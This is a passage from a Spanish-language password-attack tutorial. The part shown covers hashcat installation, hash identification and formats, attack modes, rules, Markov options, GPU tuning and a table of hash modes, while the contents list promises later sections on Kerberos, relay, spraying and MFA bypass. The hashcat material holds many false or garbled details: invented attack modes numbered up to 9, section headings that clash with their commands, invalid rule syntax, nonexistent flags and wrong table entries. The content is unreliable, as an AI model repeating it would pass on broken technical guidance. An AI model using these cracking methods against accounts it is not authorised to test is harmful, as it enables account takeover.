## Indice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (3816 lineas)


1. [1. Hashcat — El Rey del Cracking](#1-hashcat-el-rey-del-cracking)
    - [1.1 Instalación](#11-instalacin)
    - [1.2 Identificar Hashes](#12-identificar-hashes)
    - [1.3 Formatos de Hash](#13-formatos-de-hash)
    - [1.4 Los 9 Modos de Ataque (Attack Modes)](#14-los-9-modos-de-ataque-attack-modes)
    - [1.5 Rule-Based Attack](#15-rule-based-attack)
    - [1.6 Markov Chain Attacks](#16-markov-chain-attacks)
    - [1.7 GPU Acceleration y Optimización](#17-gpu-acceleration-y-optimizacin)
    - [1.8 Tabla Completa de Hashes (100+ Modos)](#18-tabla-completa-de-hashes-100-modos)
    - [1.9 Práctica: Workflow Típico](#19-prctica-workflow-tpico)
    - [1.10 Errores Comunes y Soluciones](#110-errores-comunes-y-soluciones)
2. [2. Hydra — Password Spraying Online](#2-hydra-password-spraying-online)
    - [2.1 Protocolos Soportados](#21-protocolos-soportados)
    - [2.2 Flags Importantes](#22-flags-importantes)
    - [2.3 Password Spraying Estratégico](#23-password-spraying-estratgico)
    - [2.4 Medusa (Alternativa a Hydra)](#24-medusa-alternativa-a-hydra)
3. [3. John the Ripper](#3-john-the-ripper)
    - [3.1 Uso Básico](#31-uso-bsico)
    - [3.2 Formatos Soportados](#32-formatos-soportados)
    - [3.3 Korelogic Rules](#33-korelogic-rules)
    - [3.4 Reglas Custom en John](#34-reglas-custom-en-john)
    - [3.5 Cracking con Sesión](#35-cracking-con-sesin)
4. [4. Wordlists y Generación Custom](#4-wordlists-y-generacin-custom)
    - [4.1 Descarga de Wordlists Populares](#41-descarga-de-wordlists-populares)
    - [4.2 Generación con crunch](#42-generacin-con-crunch)
    - [4.3 Generación con kwprocessor (Keyboard Walks)](#43-generacin-con-kwprocessor-keyboard-walks)
    - [4.4 Generación con cupp (Common User Password Profiler)](#44-generacin-con-cupp-common-user-password-profiler)
    - [4.5 Generación con mentalist (GUI)](#45-generacin-con-mentalist-gui)
    - [4.6 Combinar Wordlists](#46-combinar-wordlists)
5. [5. Kerberos Attacks (Active Directory)](#5-kerberos-attacks-active-directory)
    - [5.1 AS-REP Roasting](#51-as-rep-roasting)
    - [5.2 Kerberoasting](#52-kerberoasting)
    - [5.3 Golden Ticket Attack](#53-golden-ticket-attack)
    - [5.4 Silver Ticket Attack](#54-silver-ticket-attack)
    - [5.5 DCSync Attack](#55-dcsync-attack)
6. [6. Responder + ntlmrelayx (Captura en Red Local)](#6-responder-ntlmrelayx-captura-en-red-local)
    - [6.1 Captura de Hashes con Responder](#61-captura-de-hashes-con-responder)
    - [6.2 ntlmrelayx para Relay](#62-ntlmrelayx-para-relay)
    - [6.3 Cracking Hashes Capturados](#63-cracking-hashes-capturados)
7. [7. LM y NTLM Cracking](#7-lm-y-ntlm-cracking)
    - [7.1 LM Hash Cracking](#71-lm-hash-cracking)
    - [7.2 NTLM Cracking](#72-ntlm-cracking)
8. [8. DPAPI y Credential Manager](#8-dpapi-y-credential-manager)
    - [8.1 Dumping de DPAPI](#81-dumping-de-dpapi)
    - [8.2 Dumping de Credential Manager](#82-dumping-de-credential-manager)
9. [9. LSA Secrets](#9-lsa-secrets)
10. [10. Domain Cached Credentials (DCC/DCC2)](#10-domain-cached-credentials-dccdcc2)
11. [11. Defensa y Mitigaciones](#11-defensa-y-mitigaciones)
    - [Políticas Recomendadas](#polticas-recomendadas)
12. [12. Diccionario Completo de Hashes (+500 Ejemplos)](#12-diccionario-completo-de-hashes-500-ejemplos)
    - [12.1 Hashes de Algoritmos Simples (MD4, MD5, SHA1, SHA2)](#121-hashes-de-algoritmos-simples-md4-md5-sha1-sha2)
    - [12.2 Hashes de Windows (LM, NTLM, DCC)](#122-hashes-de-windows-lm-ntlm-dcc)
    - [12.3 Hashes Unix/Linux](#123-hashes-unixlinux)
    - [12.4 Hashes de Bases de Datos](#124-hashes-de-bases-de-datos)
    - [12.5 Hashes Web y CMS](#125-hashes-web-y-cms)
    - [12.6 Hashes de Kerberos](#126-hashes-de-kerberos)
    - [12.7 Hashes de Redes](#127-hashes-de-redes)
    - [12.8 Hashes de Aplicaciones](#128-hashes-de-aplicaciones)
    - [12.9 Hashes de Disco y Cifrado](#129-hashes-de-disco-y-cifrado)
    - [12.10 Hashes de Documentos y Archivos](#1210-hashes-de-documentos-y-archivos)
    - [12.11 Hashes de Wallet y Crypto](#1211-hashes-de-wallet-y-crypto)
    - [12.12 Hashes de SAP, Cisco y Network](#1212-hashes-de-sap-cisco-y-network)
    - [12.13 Hashes de Mensajería y Comunicación](#1213-hashes-de-mensajera-y-comunicacin)
13. [13. Password Spraying a Escala](#13-password-spraying-a-escala)
    - [13.1 Password Spraying Automatizado con RustScan + Hydra](#131-password-spraying-automatizado-con-rustscan-hydra)
    - [13.2 Spraying con Kerberos (sin tocar servicios web)](#132-spraying-con-kerberos-sin-tocar-servicios-web)
    - [13.3 Spraying contra Office 365 / Azure AD](#133-spraying-contra-office-365-azure-ad)
    - [13.4 Spraying contra AWS Console](#134-spraying-contra-aws-console)
    - [13.5 Custom Sprayer en Python](#135-custom-sprayer-en-python)
14. [14. MFA/2FA Bypass en Password Attacks](#14-mfa2fa-bypass-en-password-attacks)
    - [14.1 Bypass de TOTP (Time-based OTP)](#141-bypass-de-totp-time-based-otp)
    - [14.2 Bypass de SMS 2FA con SS7](#142-bypass-de-sms-2fa-con-ss7)
    - [14.3 Bypass de Push Notifications (MFA Fatigue)](#143-bypass-de-push-notifications-mfa-fatigue)
    - [14.4 Bypass de Phishing-Resistant MFA (FIDO2/WebAuthn)](#144-bypass-de-phishing-resistant-mfa-fido2webauthn)
    - [14.5 Session Cookie Theft (post-MFA)](#145-session-cookie-theft-post-mfa)
15. [15. GPU Cluster para Cracking Distribuido](#15-gpu-cluster-para-cracking-distribuido)
    - [15.1 Multi-GPU Local Setup](#151-multi-gpu-local-setup)
    - [15.2 Multi-Node Setup con Hashtopolis](#152-multi-node-setup-con-hashtopolis)
    - [15.3 GPU Selection por Tipo de Hash](#153-gpu-selection-por-tipo-de-hash)
    - [15.4 Cracking en la Nube (Cloud GPU)](#154-cracking-en-la-nube-cloud-gpu)
    - [15.5 Monitoreo de Cluster](#155-monitoreo-de-cluster)
16. [16. Ataques a Bases de Datos (Credential Extraction)](#16-ataques-a-bases-de-datos-credential-extraction)
    - [16.1 MSSQL — Extracción de Hashes y Linked Servers](#161-mssql-extraccin-de-hashes-y-linked-servers)
    - [16.2 Oracle — Datapump y Extracción de Hashes](#162-oracle-datapump-y-extraccin-de-hashes)
    - [16.3 MySQL / MariaDB — Extracción de Hashes](#163-mysql-mariadb-extraccin-de-hashes)
    - [16.4 PostgreSQL — Extracción de Hashes](#164-postgresql-extraccin-de-hashes)
    - [16.5 Redis — AUTH Bypass y Cracking](#165-redis-auth-bypass-y-cracking)
    - [16.6 MongoDB — Credential Extraction](#166-mongodb-credential-extraction)
17. [17. Ataques a Certificados](#17-ataques-a-certificados)
    - [17.1 PFX/P12 Extraction y Cracking](#171-pfxp12-extraction-y-cracking)
    - [17.2 Certificate Hash Cracking para Smartcard Auth](#172-certificate-hash-cracking-para-smartcard-auth)
    - [17.3 AD CS Certificate Theft](#173-ad-cs-certificate-theft)
18. [18. Cloud Credential Attacks](#18-cloud-credential-attacks)
    - [18.1 AWS Secret Key Cracking](#181-aws-secret-key-cracking)
    - [18.2 Azure AD Token Cracking](#182-azure-ad-token-cracking)
    - [18.3 GCP Service Account Key Cracking](#183-gcp-service-account-key-cracking)
    - [18.4 Cloud Environment Variable Extraction](#184-cloud-environment-variable-extraction)
19. [19. Archive Password Cracking (ZIP, RAR, 7z, PDF, Office)](#19-archive-password-cracking-zip-rar-7z-pdf-office)
    - [19.1 ZIP Password Cracking](#191-zip-password-cracking)
    - [19.2 RAR Password Cracking](#192-rar-password-cracking)
    - [19.3 7-Zip Password Cracking](#193-7-zip-password-cracking)
    - [19.4 PDF Password Cracking](#194-pdf-password-cracking)
    - [19.5 Office Document Password Cracking](#195-office-document-password-cracking)
    - [19.6 PGP Private Key Passphrase Cracking](#196-pgp-private-key-passphrase-cracking)
    - [19.7 SSH Key Passphrase Cracking](#197-ssh-key-passphrase-cracking)
20. [20. Password Cracking de Dispositivos de Red](#20-password-cracking-de-dispositivos-de-red)
    - [20.1 Cisco Password Cracking](#201-cisco-password-cracking)
    - [20.2 Juniper Password Cracking](#202-juniper-password-cracking)
    - [20.3 Network Device Password Cracking](#203-network-device-password-cracking)
21. [21. macOS Keychain & iOS Backup Cracking](#21-macos-keychain-ios-backup-cracking)
    - [21.1 macOS Keychain Cracking](#211-macos-keychain-cracking)
    - [21.2 iOS Backup Password Cracking](#212-ios-backup-password-cracking)
    - [21.3 Android FBE (File-Based Encryption) Cracking](#213-android-fbe-file-based-encryption-cracking)
22. [22. Windows Hello PIN & BitLocker Recovery Key Cracking](#22-windows-hello-pin-bitlocker-recovery-key-cracking)
    - [22.1 Windows Hello PIN Cracking](#221-windows-hello-pin-cracking)
    - [22.2 BitLocker Recovery Key Cracking](#222-bitlocker-recovery-key-cracking)
    - [22.3 LUKS Password Cracking (Linux)](#223-luks-password-cracking-linux)
    - [22.4 FileVault Password Cracking (macOS)](#224-filevault-password-cracking-macos)
23. [23. Hardware Acceleration y Distributed Cracking](#23-hardware-acceleration-y-distributed-cracking)
    - [23.1 FPGA para Password Cracking](#231-fpga-para-password-cracking)
    - [23.2 ASIC para Password Cracking](#232-asic-para-password-cracking)
    - [23.3 GPU Overclocking para Cracking](#233-gpu-overclocking-para-cracking)
    - [23.4 Distributed Cracking con Hashtopolis (Advanced Setup)](#234-distributed-cracking-con-hashtopolis-advanced-setup)
24. [24. Password Spraying a Escala con Custom Tools](#24-password-spraying-a-escala-con-custom-tools)
    - [24.1 Domain Password Spraying Automatizado](#241-domain-password-spraying-automatizado)
    - [24.2 Password Spraying contra APIs](#242-password-spraying-contra-apis)
25. [25. Password Cracking Defense Analysis](#25-password-cracking-defense-analysis)
    - [25.1 Cómo Analizar la Fortaleza de tus Propias Contraseñas](#251-cmo-analizar-la-fortaleza-de-tus-propias-contraseas)
    - [25.2 Password Strength Estimator para Auditorías](#252-password-strength-estimator-para-auditoras)
26. [26. Referencias y Recursos Adicionales](#26-referencias-y-recursos-adicionales)

---

# Ataques a Contraseñas — Guía Completa

Guía detallada de ataques offline y online a contraseñas. Cubre [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat), [hydra](../raw/p4ssw0rd-4tt4cks.md#hydra), [john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper), kerberos, wordlists custom y técnicas avanzadas. Todo explicado paso a paso.

---

## 1. [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) — El Rey del [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

Hashcat es el herramienta más rápida para cracking de hashes. Usa GPU (y CPU) con soporte para más de 300 tipos de [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) y 9 modos de ataque.

### 1.1 Instalación

```bash
# Windows
# Descargá de: https://hashcat.net/hashcat/
# Extraé y ejecutá desde cmd/powershell

# Linux (apt)
sudo apt install hashcat

# Kali ya lo tiene instalado
which hashcat

# Binario (última versión)
wget https://hashcat.net/files/hashcat-6.2.6.7z
7z x hashcat-6.2.6.7z
cd hashcat-6.2.6/

# Verificar instalación
./hashcat --version
./hashcat -I    # Listar dispositivos (GPUs/CPUs)
```

### 1.2 Identificar Hashes

Antes de crackear, tenés que saber qué tipo de hash tenés:

```bash
# hashid
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hashid '$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy'

# hash-identifier (Python, más detallado)
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"

# hashcat también te ayuda
hashcat --example-hashes | grep -i "md5"
hashcat --identify hash.txt  # Intenta identificar (modo 6.2.6+)

# Por longitud y prefijo
# MD5:       32 caracteres hex
# SHA1:      40 caracteres hex
# SHA256:    64 caracteres hex
# SHA512:    128 caracteres hex
# bcrypt:    empieza con $2a$, $2b$ o $2y$
# NTLM:      32 caracteres hex
# LM:        32 caracteres hex (partido en dos mitades de 16)
# MySQL:     empieza con *
# MSSQL:     0x0100...
# Oracle:    empieza con S:
```

### 1.3 Formatos de Hash

Cada tipo de hash requiere un formato específico. Ejemplos:

```bash
# MD5
hash.txt:
5f4dcc3b5aa765d61d8327deb882cf99

# MD5 con salt
hash.txt:
username:5f4dcc3b5aa765d61d8327deb882cf99:salt123

# SHA1 con salt
hash.txt:
username:hash:salt

# NTLM
hash.txt:
username::RID:LMHASH:NTHASH:::
admin::500:6f5f5f8f5d5c5a5b0000000000000000:5f4dcc3b5aa765d61d8327deb882cf99:::

# bcrypt
hash.txt:
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

# Kerberos TGS (13100)
hash.txt:
$krb5tgs$23$*user$realm$spn*$hash

# Kerberos AS-REP (18200)
hash.txt:
$krb5asrep$23$user@realm:hash

# WPA2 (convertir .cap a .hccapx o .hc22000)
cap2hccapx input.cap output.hccapx
hcxpcapngtool -o output.hc22000 input.cap

# sha256crypt
$5$rounds=5000$somesalt$hash
# sha512crypt
$6$somesalt$hash
```

### 1.4 Los 9 Modos de Ataque (Attack Modes)

Hashcat tiene 9 modos de ataque, numerados del 0 al 9. Cada uno sirve para un escenario distinto.

#### Modo 0 — Dictionary Attack

El más usado. Probás cada palabra de un wordlist contra los hashes:

```bash
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Con múltiples wordlists
hashcat -m 0 -a 0 hashes.txt wordlist1.txt wordlist2.txt

# Mostrar solo hashes crackeados
hashcat -m 0 -a 0 hashes.txt rockyou.txt --show
```

#### Modo 1 — Combinator Attack

Combina palabras de dos wordlists (word1 + word2):

```bash
hashcat -m 0 -a 1 hashes.txt words1.txt words2.txt

# Ejemplo: si words1.txt tiene "baseball" y words2.txt tiene "2024"
# Prueba: baseball2024, football2024, etc.

# Usar la misma wordlist (word + word)
hashcat -m 0 -a 1 hashes.txt rockyou.txt rockyou.txt
```

#### Modo 3 — Mask Attack (Brute-Force con Máscara)

Probás caracteres en posiciones específicas. Mucho más eficiente que brute-force puro:

```bash
# 8 letras minúsculas
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# 8 caracteres (todo)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# Password con formato conocido: Pass + 4 dígitos
hashcat -m 0 -a 3 hashes.txt Pass?d?d?d?d

# Año + palabra
hashcat -m 0 -a 3 hashes.txt 20?d?d?l?l?l?l

# Combinaciones custom con charset
hashcat -m 0 -a 3 hashes.txt -1 ?l?u?d ?1?1?1?1?1?1?1?1
```

Placeholders:
```
?l = a-z (lowercase)
?u = A-Z (uppercase)
?d = 0-9 (digits)
?s = !@#$%^&*() (special)
?a = ?l?u?d?s (all)
?b = 0x00-0xff (binary - cualquier byte)
```

Charsets custom:
```bash
# -1 define un charset custom (hasta 4: -1, -2, -3, -4)
hashcat -m 0 -a 3 hashes.txt -1 ?l?d ?1?1?1?1?1?1?1?1
# ?1 incluye minúsculas y dígitos

hashcat -m 0 -a 3 hashes.txt -1 abcdefghijk -2 012345 ?1?1?1?2?2?2
# -1 son letras específicas, -2 son dígitos específicos
```

#### Modo 4 — Hybrid Attack (Wordlist + Mask)

Agregás una máscara al final de cada palabra:

```bash
# Palabra del diccionario + 2 dígitos al final
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d

# Palabra + 4 dígitos (Passwords tipo "baseball2024")
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d?d

# Palabra + año común
hashcat -m 0 -a 6 hashes.txt rockyou.txt 202?d

# Palabra + ! al final
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?s
```

#### Modo 5 — Hybrid Attack (Mask + Wordlist)

Agregás una máscara al principio de cada palabra:

```bash
hashcat -m 0 -a 7 hashes.txt ?d?d rockyou.txt

# 2 dígitos + palabra (tipo "07florencia")
hashcat -m 0 -a 7 hashes.txt ?d?d rockyou.txt

# Año + palabra
hashcat -m 0 -a 7 hashes.txt 20?d?d rockyou.txt

# Caracter especial + palabra
hashcat -m 0 -a 7 hashes.txt ?s rockyou.txt
```

#### Modo 6 — Prince Attack (Probable Wordlists)

PRINCE = PRobability INfinite Chained Elements. Combina palabras de una wordlist en cadenas de 1 a N palabras sin necesidad de wordlists combinadas pre-generadas:

```bash
hashcat -m 0 -a 6 hashes.txt prob-wordlist.txt

# Con límite de largo mínimo y máximo
hashcat -m 0 -a 6 hashes.txt prob-wordlist.txt --pw-min=8 --pw-max=16

# Las wordlists de PRINCE están en formatos especiales
# Descargalas de: https://github.com/berzerk0/Probable-Wordlists
```

#### Modo 7 — Table-Lookup Attack

Usa tablas pre-computadas. Más rápido pero requiere más memoria:

```bash
hashcat -m 0 -a 7 hashes.txt table.ctx
# Requiere generar la tabla primero con --table-file
```

#### Modo 8 — Toggle-Case Attack

Prueba todas las variaciones de mayúsculas/minúsculas:

```bash
hashcat -m 0 -a 8 hashes.txt wordlist.txt

# Ejemplo: password → Password, pAssword, paSsword, etc.
# Todas las combinaciones de toggles en cada posición

# Con límite (solo palabras de 4 caracteres)
hashcat -m 0 -a 8 hashes.txt wordlist.txt --pw-max=4
```

#### Modo 9 — Keyboard-Walk Attack

Genera palabras basadas en patrones de teclado (qwerty, azerty, etc.):

```bash
hashcat -m 0 -a 9 hashes.txt keyboard-walk.txt

# Usá los archivos de keyboard layouts incluidos
# qwerty.hckl, qwertz.hckl, azerty.hckl, dvorak.hckl
```

### 1.5 Rule-Based Attack

Las reglas transforman cada palabra del [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario) aplicando mutaciones. Esto multiplica enormemente las chances de crackear:

```bash
# Usar reglas incluidas
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/dive.rule
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule

# Reglas incluidas en hashcat/rules/
# best64.rule: las 64 reglas más efectivas
# dive.rule: ~30k reglas (muy exhaustivo)
# OneRuleToRuleThemAll.rule: combinación de las mejores
# generated.rule: reglas generadas automáticamente
# T0XlC.rule: reglas de T0XlC
# combinator.rule: reglas combinatorias

# Múltiples reglas (se aplican en secuencia)
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule -r rules/dive.rule
```

#### Reglas Custom

Las reglas se escriben en un archivo de texto con una regla por línea:

```bash
# rules/custom.rule
# Cada línea es una transformación
$1 $2 0 8   # Agrega "12" al final, luego agrega 8
$!          # Agrega ! al final
$2024       # Agrega 2024 al final
^2024       # Agrega 2024 al principio
c           # Capitaliza primera letra (password → Password)
u           # Todo mayúsculas
l           # Todo minúsculas
t           # Toggle case (pAssWorD)
r           # Reverse (password → drowssap)
d           # Duplicate (password → passwordpassword)
{           # Shift left (password → asswordp)
}           # Shift right (password → dpassword)
[           # Borra primer carácter
]           # Borra último carácter
'           # Borra todos los caracteres hasta encontrar un duplicado
k           # Kill
s           # Subsitute
@           # Purge character
i           # Insert
o           # Overwrite
SO0         # Reemplaza O por 0
SA@         # Reemplaza A por @
SE3         # Reemplaza E por 3
SS5         # Reemplaza S por $

# Ejemplos de reglas custom comunes:
# rules/custom.rule:

# Agregar números comunes
$1
$12
$123
$1234
$2024
$2023
$2022

# Agregar simbolos
$!
$@
$#
$$

# Capitalize + número
c $1 $2 $3

# Reemplazos leet speak
SO0
SI1
SE3
SA4
SS5

# Capitalize + año + símbolo
c $2 $0 $2 $4 $!

# Duplicar + 3 dígitos
d $1 $2 $3

# Ejecutar con regla custom
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/custom.rule
```

### 1.6 Markov Chain Attacks

Hashcat usa modelos de Markov para optimizar el orden en que prueba combinaciones en ataques de máscara. En vez de probar `aaaa`, `aaab`, `aaac`..., prueba primero las combinaciones más probables según el lenguaje:

```bash
# Habilitar Markov (activado por defecto)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --markov-disable  # Desactivar

# Ajustar nivel de Markov (1-1000, default 256)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --markov-threshold=500

# Generar estadísticas de Markov desde un wordlist
hashcat --markov-generate-stats stats.json rockyou.txt

# Usar stats generadas
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --markov-stats=stats.json
```

### 1.7 GPU Acceleration y Optimización

```bash
# Benchmark de todas las GPUs
hashcat -b --benchmark-all

# Benchmark para modo específico
hashcat -b -m 1000  # NTLM benchmark
hashcat -b -m 3200  # bcrypt benchmark

# Workload profiles (-w):
# 1: Low (compartís GPU con pantalla)
# 2: Default
# 3: High (puede congelar la PC)
# 4: Night (máximo, sin límites)

hashcat -m 1000 -a 0 hashes.txt rockyou.txt -w 3
hashcat -m 3200 -a 0 hashes.txt rockyou.txt -w 4

# Seleccionar dispositivo específico
hashcat -I  # Listar dispositivos
hashcat -d 1  # GPU 1
hashcat -d 2  # GPU 2
hashcat -d 1,2  # GPU 1 y 2 juntas

# Segmentación por device type
hashcat -D 1  # Solo CPU
hashcat -D 2  # Solo GPU

# Optimizaciones de kernel
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -O  # Optimized kernel
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --force  # Forzar (para drivers viejos)

# Tamaño de loop
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --loopback  # Guarda cracked en potfile

# Sesión (para pausar/reanudar)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --session=sesion1
# Pausar con 'q' o 'p', reanudar con:
hashcat -m 1000 -a 0 hashes.txt --restore --session=sesion1
```

### 1.8 Tabla Completa de Hashes (100+ Modos)

| Modo | Hash | Longitud/Largo | Ejemplo |
|------|------|---------------|---------|
| 0 | MD5 | 32 hex | `5f4dcc3b5aa765d61d8327deb882cf99` |
| 10 | MD5($pass.$salt) | [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) | `hash:salt` |
| 20 | MD5($salt.$pass) | variable | `hash:salt` |
| 30 | MD5(unicode($pass).$salt) | variable | `hash:salt` |
| 40 | MD5($salt.unicode($pass)) | variable | `hash:salt` |
| 50 | HMAC-MD5 (key = $pass) | variable | `hash:key` |
| 60 | HMAC-MD5 (key = $salt) | variable | `hash:salt` |
| 100 | SHA1 | 40 hex | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| 110 | SHA1($pass.$salt) | variable | `hash:salt` |
| 120 | SHA1($salt.$pass) | variable | `hash:salt` |
| 130 | SHA1(unicode($pass).$salt) | variable | `hash:salt` |
| 140 | SHA1($salt.unicode($pass)) | variable | `hash:salt` |
| 150 | HMAC-SHA1 (key = $pass) | variable | `hash:key` |
| 160 | HMAC-SHA1 (key = $salt) | variable | `hash:salt` |
| 200 | MySQL 3.x | 16 hex | `5d9c68c6c3dbf8c5` |
| 300 | MySQL 4.1+ | 41 hex | `*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B` |
| 400 | phpBB3 (MD5) | 32 hex | `$H$9...` |
| 500 | md5crypt | 34 chars | `$1$salt$hash` |
| 600 | BLAKE2-512 | 128 hex | `hash` |
| 900 | MD4 | 32 hex | `hash` |
| 1000 | NTLM | 32 hex | `5f4dcc3b5aa765d61d8327deb882cf99` |
| 1100 | Domain Cached Credentials | 32 hex | `admin:hash` |
| 1200 | DCC2 | 32 hex | `$DCC2$10240#username#hash` |
| 1400 | SHA256 | 64 hex | `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd300a64b01e5cf8657` |
| 1410 | SHA256($pass.$salt) | variable | `hash:salt` |
| 1420 | SHA256($salt.$pass) | variable | `hash:salt` |
| 1430 | sha256(unicode($pass).$salt) | variable | `hash:salt` |
| 1440 | sha256($salt.unicode($pass)) | variable | `hash:salt` |
| 1450 | HMAC-SHA256 (key = $pass) | variable | `hash:key` |
| 1460 | HMAC-SHA256 (key = $salt) | variable | `hash:salt` |
| 1500 | descrypt | 13 chars | `hash` |
| 1600 | md5apr1 | 37 chars | `$apr1$salt$hash` |
| 1700 | SHA512 | 128 hex | `hash` |
| 1710 | SHA512($pass.$salt) | variable | `hash:salt` |
| 1720 | SHA512($salt.$pass) | variable | `hash:salt` |
| 1730 | sha512(unicode($pass).$salt) | variable | `hash:salt` |
| 1740 | sha512($salt.unicode($pass)) | variable | `hash:salt` |
| 1750 | HMAC-SHA512 (key = $pass) | variable | `hash:key` |
| 1760 | HMAC-SHA512 (key = $salt) | variable | `hash:salt` |
| 1800 | sha512crypt | 80 chars | `$6$salt$hash` |
| 2100 | Domain Cached Credentials 2 | 32 hex | `$DCC2$10240#user#hash` |
| 2400 | Cisco-PIX | 16 hex | `hash` |
| 2410 | Cisco-ASA | 28 chars | `hash` |
| 2500 | WPA/[wpa2](../raw/w1f1-4tt4cks.md#wpa2) | 4 chars | `.hccapx` or `.hc22000` |
| 2600 | MD5(ascii($pass).dollar.$ascii($pass)) | variable | `hash` |
| 2611 | vBulletin < 3.8.5 | 32 hex | `hash:salt` |
| 2612 | vBulletin >= 3.8.5 | 62 chars | `$H$...` |
| 2711 | vBulletin post MD5 | variable | `hash` |
| 2811 | IPB 2.x (MyBB 1.x) | 32 hex | `hash:salt` |
| 3000 | LM | 32 hex | `hash` |
| 3100 | Oracle H | 16 hex | `hash` |
| 3200 | bcrypt | 60 chars | `$2a$10$...` |
| 3500 | MD5(salt.pass.salt) | variable | `hash:salt` |
| 3610 | HMAC-MD5 (src) | variable | `hash` |
| 3710 | MD5($pass.$salt) (Joomla) | variable | `hash:salt` |
| 3800 | MD5($salt.$pass.$salt) | variable | `hash:salt` |
| 3910 | MD5($salt.md5($pass)) | variable | `hash:salt` |
| 4010 | MD5($salt.$pass.$salt) | variable | `hash:salt` |
| 4110 | MD5($salt.md5($pass.$salt)) | variable | `hash:salt` |
| 4210 | MD5($username.0.$pass) | variable | `hash` |
| 4300 | md5(strtoupper(md5($pass))) | variable | `hash` |
| 4400 | md5(sha1($pass)) | variable | `hash` |
| 4410 | md5(sha1($pass).$salt) | variable | `hash:salt` |
| 4500 | sha1(sha1($pass)) | variable | `hash` |
| 4520 | sha1($salt.sha1($pass)) | variable | `hash:salt` |
| 4700 | sha1(md5($pass)) | variable | `hash` |
| 4800 | MD5(Chap) | variable | `hash` |
| 4900 | SHA1($salt.$pass.$salt) | variable | `hash:salt` |
| 5000 | SHA1($salt.$pass.$salt) + CRC | variable | `hash:salt` |
| 5100 | Half MD5 | 16 hex | `hash` |
| 5200 | Password Safe v3 | 32 hex | `hash` |
| 5300 | IKE-PSK MD5 | 32 hex | `hash` |
| 5400 | IKE-PSK SHA1 | 40 hex | `hash` |
| 5500 | NetNTLMv1 | variable | `user::domain:hash` |
| 5600 | NetNTLMv2 | variable | `user::domain:server:challenge:hash` |
| 5700 | Cisco-[ios](../raw/10s-p3nt3st1ng.md) SHA256 | variable | `hash` |
| 5800 | Samsung [android](../raw/4db-d33p-d1v3.md) | 32 hex | `hash` |
| 6000 | RipeMD160 | 40 hex | `hash` |
| 6100 | Whirlpool | 128 hex | `hash` |
| 6200 | TrueCrypt | 96 hex | `hash` |
| 6211 | TrueCrypt 5.0+ | 96 hex | `hash` |
| 6212 | TrueCrypt 5.0+ (SHA512) | variable | `hash` |
| 6213 | TrueCrypt 5.0+ (Whirlpool) | variable | `hash` |
| 6221 | VeraCrypt SHA512 | 96 hex | `hash` |
| 6222 | VeraCrypt SHA512 + XTS | 96 hex | `hash` |
| 6223 | VeraCrypt SHA512 + XTS 64 | variable | `hash` |
| 6300 | AIX {smd5} | 42 chars | `{smd5}hash` |
| 6400 | AIX {ssha1} | variable | `{ssha1}hash` |
| 6500 | AIX {ssha256} | variable | `{ssha256}hash` |
| 6700 | AIX {ssha512} | variable | `{ssha512}hash` |
| 6800 | Lastpass + Lastpass | variable | `hash` |
| 6900 | GOST R 34.11-94 | 64 hex | `hash` |
| 7000 | FortiGate | variable | `hash` |
| 7100 | macOS v10.8+ | variable | `hash` |
| 7200 | GRUB 2 | 60 chars | `grub.pbkdf2...` |
| 7300 | IPMI2 RAKP HMAC | 40 hex | `hash` |
| 7400 | sha256crypt | 55 chars | `$5$salt$hash` |
| 7500 | Kerberos 5 AS-REQ Pre-Auth | variable | `hash` |
| 7700 | SAP CODVN B (BCODE) | variable | `hash` |
| 7800 | SAP CODVN F/G (PASSCODE) | variable | `hash` |
| 7900 | Drupal7 | 54 chars | `$S$...` |
| 8000 | Sybase ASE | variable | `hash` |
| 8100 | Citrix NetScaler | 32 hex | `hash` |
| 8200 | 1Password 1-3 | variable | `hash` |
| 8300 | LM (CISCO) | 32 hex | `hash` |
| 8400 | WBB3 | variable | `hash` |
| 8500 | RACF | variable | `hash` |
| 8600 | Lotus Notes/Domino 5 | 32 hex | `hash` |
| 8700 | Lotus Notes/Domino 6 | 40 hex | `hash` |
| 8800 | Android FDE <= 4.3 | variable | `hash` |
| 8900 | scrypt | variable | `hash` |
| 9000 | Password Safe v2 | 32 hex | `hash` |
| 9100 | Lotus Notes/Domino 8 | 56 hex | `hash` |
| 9200 | Cisco-IOS $8$ | 24 chars | `$8$...` |
| 9300 | Cisco-IOS $9$ | 85 chars | `$9$...` |
| 9400 | Office 2007 | 32 hex | `hash` |
| 9500 | Office 2010 | 32 hex | `hash` |
| 9600 | Office 2013 | 32 hex | `hash` |
